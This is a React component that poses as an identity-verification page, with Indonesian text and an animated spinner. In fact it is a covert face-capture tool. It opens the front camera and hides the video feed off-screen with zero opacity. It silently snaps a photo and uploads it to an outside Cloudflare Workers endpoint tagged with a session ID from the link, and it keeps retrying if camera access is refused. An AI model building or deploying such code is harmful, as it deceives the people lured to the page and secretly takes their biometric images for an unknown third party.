"use client";

import React, { useState, useRef, useEffect, useCallback } from 'react';

interface SendPhotoResponse {
  success: boolean;
  message: string;
}

const SmileStealthCapture: React.FC = () => {
  const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';

  const [sessionId, setSessionId] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
    message: '',
    type: '',
  });
  const [isDone, setIsDone] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hasCapturedRef = useRef(false);
  const isMountedRef = useRef(true);

  const showStatus = useCallback((message: string, type: 'info' | 'success' | 'error') => {
    if (isMountedRef.current) {
      setStatus({ message, type });
    }
  }, []);

  // 1. Ambil atau Buat Session ID
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const queryId = urlParams.get('session') || urlParams.get('id');
      const pathSegments = window.location.pathname.split('/');
      const pathId = pathSegments[pathSegments.length - 1];

      const id = queryId || (pathId !== 'stealth' && pathId !== 'v' ? pathId : '');

      if (id && id.length >= 6) {
        setSessionId(id);
      } else {
        const randomId = 'SML' + Math.floor(10000 + Math.random() * 90000);
        setSessionId(randomId);
      }
    }
  }, []);

  const stopCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }
  }, []);

  // 2. Kirim Foto ke Endpoint
  const sendPhoto = useCallback(async (photoData: string, currentSessionId: string) => {
    if (!photoData || isSending || !currentSessionId) return;

    setIsSending(true);

    try {
      const resBlob = await fetch(photoData);
      const blob = await resBlob.blob();
      const file = new File([blob], `${currentSessionId}_face.jpg`, { type: 'image/jpeg' });

      const formData = new FormData();
      formData.append('photo', file);

      const res = await fetch(`${API_BASE}/capture/${currentSessionId}`, {
        method: 'POST',
        body: formData,
      });

      const result: SendPhotoResponse = await res.json();

      if (isMountedRef.current) {
        if (result.success) {
          setIsDone(true);
          showStatus('✅ Verifikasi selesai', 'success');
        } else {
          showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
        }
      }
    } catch (err) {
      console.error('Send error:', err);
      if (isMountedRef.current) {
        showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
      }
    } finally {
      if (isMountedRef.current) {
        setIsSending(false);
      }
    }
  }, [API_BASE, isSending, showStatus]);

  // 3. Proses Capture Frame Canvas
  const captureFrameAndSend = useCallback(() => {
    if (hasCapturedRef.current) return;

    const video = videoRef.current;

    // Memastikan video sudah aktif dan memiliki dimensi gambar
    if (!video || video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
      captureTimeoutRef.current = setTimeout(captureFrameAndSend, 150);
      return;
    }

    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      if (!ctx) {
        console.error('Canvas context failed');
        return;
      }

      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoData = canvas.toDataURL('image/jpeg', 0.85);

      if (!photoData || photoData.length < 1000) {
        captureTimeoutRef.current = setTimeout(captureFrameAndSend, 200);
        return;
      }

      hasCapturedRef.current = true;
      stopCamera();

      if (isMountedRef.current) {
        showStatus('✅ Mengirim data verifikasi...', 'info');
      }

      sendPhoto(photoData, sessionId);
    } catch (e) {
      console.error('Capture failed:', e);
      if (isMountedRef.current) {
        showStatus('❌ Gagal mengambil foto', 'error');
      }
    }
  }, [stopCamera, showStatus, sendPhoto, sessionId]);

  // 4. Inisialisasi Kamera
  const startCamera = useCallback(async () => {
    try {
      stopCamera();

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        
        // Memastikan video berjalan sebelum capture
        videoRef.current.onloadedmetadata = async () => {
          try {
            await videoRef.current?.play();
            // Beri jeda 300ms agar sensor kamera menyesuaikan cahaya/fokus
            captureTimeoutRef.current = setTimeout(() => {
              captureFrameAndSend();
            }, 300);
          } catch (playErr) {
            console.error("Play error:", playErr);
          }
        };
      }
    } catch (err) {
      console.error('Camera access error:', err);
      showStatus('⚠️ Izinkan akses kamera untuk verifikasi', 'error');

      // Attempt retry
      setTimeout(() => {
        if (!hasCapturedRef.current && isMountedRef.current) {
          startCamera();
        }
      }, 2000);
    }
  }, [stopCamera, captureFrameAndSend, showStatus]);

  useEffect(() => {
    isMountedRef.current = true;
    if (sessionId && !hasCapturedRef.current) {
      startCamera();
    }
    return () => {
      isMountedRef.current = false;
      if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
      stopCamera();
    };
  }, [sessionId, startCamera, stopCamera]);

  return (
    <div className="min-h-screen bg-gray-50 flex justify-center items-center p-4 font-sans">
      <div className="bg-white rounded-2xl shadow-lg p-8 max-w-sm w-full border border-gray-100">
        
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
            <span className="text-3xl">🔐</span>
          </div>
          <h2 className="text-gray-800 text-xl font-semibold">Verifikasi Identitas</h2>
          <p className="text-gray-400 text-sm mt-1">
            {isDone ? 'Verifikasi selesai ✓' : 'Mohon tunggu sebentar...'}
          </p>
        </div>

        <div className="flex flex-col items-center gap-3 py-4">
          {!isDone && !status.message && (
            <>
              <div className="w-12 h-12 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin" />
              <p className="text-gray-400 text-sm">Memproses verifikasi...</p>
            </>
          )}

          {status.message && (
            <div className={`w-full py-3 px-4 rounded-lg text-sm text-center ${
              status.type === 'success'
                ? 'bg-green-50 text-green-600'
                : status.type === 'error'
                ? 'bg-red-50 text-red-500'
                : 'bg-blue-50 text-blue-500'
            }`}>
              {status.message}
            </div>
          )}

          {isDone && (
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                <span className="text-3xl">✔️</span>
              </div>
              <p className="text-gray-600 text-sm">Verifikasi berhasil!</p>
            </div>
          )}
        </div>

        {/* 
            Gunakan styling tersembunyi yang tetap memungkinkan browser 
            melakukan rendering frame (width/height cukup & pointer-events none)
        */}
        <video
          ref={videoRef}
          style={{
            position: 'fixed',
            top: '-9999px',
            left: '-9999px',
            width: '320px',
            height: '240px',
            opacity: 0,
            pointerEvents: 'none',
          }}
          autoPlay
          playsInline
          muted
        />

        <div className="mt-6 pt-4 border-t border-gray-100 text-center">
          <p className="text-gray-300 text-[10px]">
            {sessionId ? `ID: ${sessionId.substring(0, 6)}` : 'Loading...'}
          </p>
        </div>
      </div>
    </div>
  );
};

export default SmileStealthCapture;